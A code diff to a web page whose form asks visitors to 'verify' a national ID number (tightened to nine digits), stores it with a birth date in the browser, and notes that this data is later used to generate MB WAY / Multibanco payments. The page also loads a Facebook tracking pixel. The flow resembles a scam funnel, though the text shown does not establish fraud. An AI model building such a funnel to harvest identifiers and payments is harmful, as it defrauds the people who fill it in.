@@ -992,7 +992,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 <form id="step1Form">
 <div class="form-group">
 <label><span data-msg="step2.t04">Your National ID Number</span></label>
-<input id="cpf" inputmode="numeric" maxlength="20" placeholder="123 456 789" required="" type="tel"/>
+<input id="cpf" inputmode="numeric" maxlength="11" placeholder="123 456 789" required="" type="tel"/>
 </div>
 <button class="btn btn-primary" id="submitBtn1" type="submit">
 <span class="btn-text"><span data-msg="step2.t05">Verify my National ID Number</span></span>
@@ -1141,8 +1141,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       const nif = document.getElementById('cpf').value.replace(/\D/g, '');
       const btn = document.getElementById('submitBtn1');
 
-      if (nif.length < 5 || nif.length > 20) {
-        alert('Invalid National ID Number. Please check the number and try again.');
+      if (nif.length !== 9) {
+        alert('Invalid National ID Number. Please enter 9 digits.');
         return;
       }
 
@@ -1227,7 +1227,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
           input.style.borderColor = '#DC2626'; input.focus(); return;
         }
 
-        // Guardar dados do cliente (depois usados para gerar pagamentos)
+        // Guardar dados do cliente (depois usados para gerar pagamentos MB WAY / Multibanco)
         localStorage.setItem('data_nasc', v);
         const cliente = {
           nif: localStorage.getItem('nif') || '',
